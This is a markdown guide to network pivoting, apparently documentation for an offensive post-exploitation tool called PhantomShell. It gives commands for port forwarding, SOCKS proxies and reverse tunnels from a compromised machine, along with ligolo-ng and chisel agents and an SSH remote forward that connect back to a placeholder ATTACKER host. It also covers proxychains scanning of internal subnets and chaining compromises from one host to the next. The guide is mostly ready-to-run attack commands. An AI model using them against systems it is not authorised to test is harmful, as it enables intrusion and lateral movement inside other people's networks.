# Pivoting Guide

## Built-in Pivoting

### TCP Port Forwarding
Forward local port to remote host through the compromised machine:
```
pivot_portfwd 8080 10.10.10.5 80
```
This listens on :8080 and forwards to 10.10.10.5:80

### SOCKS4 Proxy
Start a SOCKS4 proxy on the compromised machine:
```
pivot_socks
```
Listens on :1080. Configure your tools:
```bash
proxychains nmap -sT 10.10.10.0/24
```

### Reverse Tunnel
```
pivot_tunnel 10.10.10.5 3306 13306
```
Access internal MySQL at localhost:13306

## External Tool Guides

### Ligolo-ng (Recommended)
```bash
# Attacker
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Target
./agent -connect ATTACKER:11601 -ignore-cert

# In ligolo console
session
start
```

### Chisel
```bash
# Attacker
chisel server -p 8000 --reverse

# Target - SOCKS proxy
chisel client ATTACKER:8000 R:socks

# Target - Port forward
chisel client ATTACKER:8000 R:8080:127.0.0.1:80
```

### SSH Tunneling
```bash
# Dynamic SOCKS proxy
ssh -D 1080 -N user@pivot

# Local port forward
ssh -L 8080:target:80 user@pivot

# Remote port forward
ssh -R 9090:localhost:22 user@attacker
```

### Proxychains
PhantomShell can generate a proxychains config:
```
pivot_proxychain
```
Creates `/tmp/.proxychains.conf` ready to use.

## Network Discovery
```
auto_pivot
```
Automatically scans all connected subnets for SSH (22) and HTTP (80) services.

## Chaining Pivots

1. Compromise Host A
2. Start SOCKS4: `pivot_socks`
3. Through proxy, compromise Host B
4. On Host B, forward to Host C: `pivot_portfwd 9090 10.10.10.50 22`
